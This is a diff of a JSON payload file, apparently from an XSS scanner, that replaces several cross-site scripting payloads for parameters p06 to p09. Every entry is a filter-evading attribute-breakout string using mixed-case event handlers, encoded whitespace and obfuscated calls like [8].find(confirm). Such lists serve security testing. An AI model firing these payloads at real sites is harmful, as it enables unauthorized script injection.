@@ -55,16 +55,22 @@
   {
     "payloads": [
       {
-        "payload": "\"><A%0dONPoINTeRENteR%0a=%0aconfirm()%0dx>v3dm0s"
+        "payload": "\"><hTml/+/oNmoUSEOvER%0d=%0dconfirm()>"
       },
       {
-        "payload": "\"><a/+/oNMouSeOVEr%09=%09a=prompt,a()%0dx>v3dm0s"
+        "payload": "\"><d3V%09ONMoUSEOVer+=+confirm()%0dx>v3dm0s"
       },
       {
-        "payload": "\"><HTml%0dOnmoUsEOvEr+=+[8].find(confirm)%0dx//"
+        "payload": "\"><HTML%0aONmoUseoVER%0d=%0da=prompt,a()>"
       },
       {
-        "payload": "\"><HTML%0aONMOusEOVEr%09=%09(prompt)``%0dx//"
+        "payload": "\"><dEtAIls/+/ONtOgGle%0d=%0d(prompt)``//"
+      },
+      {
+        "payload": "\"><d3v%0dONMoUsEoVEr%09=%09(prompt)``%0dx>v3dm0s"
+      },
+      {
+        "payload": "\"><DETaIls%0dOntogGLe+=+a=prompt,a()%0dx>"
       }
     ],
     "parameter": "p06"
@@ -72,16 +78,22 @@
   {
     "payloads": [
       {
-        "payload": "'><DETails%0aONpOinTerenter%0a=%0aconfirm()>"
+        "payload": "'><A/+/onMOUseOVEr+=+a=prompt,a()>v3dm0s"
       },
       {
-        "payload": "'><A%0aoNMOusEOVER%09=%09confirm()%0dx>v3dm0s"
+        "payload": "'><a%0aOnMoUseOVEr%0a=%0a(confirm)()>v3dm0s"
       },
       {
-        "payload": "'><HTML%0dONMOusEOver%09=%09a=prompt,a()%0dx//"
+        "payload": "'><HTmL%0aONmOuseovER+=+(prompt)``%0dx>"
       },
       {
-        "payload": "'><dEtaILS%0aOnpOINteReNTer%0d=%0dconfirm()%0dx>"
+        "payload": "'><HtmL/+/oNPOInTERenTER%0d=%0d(prompt)``//"
+      },
+      {
+        "payload": "'><d3V/+/ONMousEOVER+=+[8].find(confirm)%0dx>v3dm0s"
+      },
+      {
+        "payload": "'><DETAils%09OnpoIntEREnTeR%09=%09[8].find(confirm)//"
       }
     ],
     "parameter": "p07"
@@ -89,16 +101,22 @@
   {
     "payloads": [
       {
-        "payload": "\"/+/AuTofOCUS/+/OnfOcUs=\"a=prompt,a()"
+        "payload": "\"%09AUtoFoCuS%09ONFOCUs=\"(confirm)()"
       },
       {
-        "payload": "\"/+/AutofoCus/+/OnFOcus=\"[8].find(confirm)"
+        "payload": "\"%09autofoCus%09oNFoCuS=\"confirm()"
       },
       {
-        "payload": "\"%09AUToFoCus%09oNFocUS=\"[8].find(confirm)"
+        "payload": "\"%0aaUToFOCus%0aONFOCus=\"[8].find(confirm)"
       },
       {
-        "payload": "\"/+/autOFocUS/+/ONfocUs=\"confirm()"
+        "payload": "\"/+/autOFOCus/+/onfoCus=\"[8].find(confirm)"
+      },
+      {
+        "payload": "\"%09AUtofOCuS%09onFOCus=\"a=prompt,a()"
+      },
+      {
+        "payload": "\"%0dAuTOfocus%0doNfOcUs=\"a=prompt,a()"
       }
     ],
     "parameter": "p08"
@@ -106,16 +124,22 @@
   {
     "payloads": [
       {
-        "payload": "'%0dAuTofOcUs%0doNFOcuS='a=prompt,a()"
+        "payload": "'%0aaUTOFocus%0aONfocus='confirm()"
       },
       {
-        "payload": "'%09auTOfoCus%09onfOcUs='a=prompt,a()"
+        "payload": "'%0aAuTOFOcus%0aoNfOcUs='confirm()"
       },
       {
-        "payload": "'%0aaUtoFoCus%0aoNFOCUs='[8].find(confirm)"
+        "payload": "'/+/autOFocuS/+/ONfocUs='(confirm)()"
       },
       {
-        "payload": "'%0aauToFoCuS%0aoNfocUS='confirm()"
+        "payload": "'/+/AutOFOcus/+/onFOcus='confirm()"
+      },
+      {
+        "payload": "'%0aAuTOFOcus%0aonfocus='(prompt)``"
+      },
+      {
+        "payload": "'/+/aUToFocUs/+/oNfocuS='[8].find(confirm)"
       }
     ],
     "parameter": "p09"
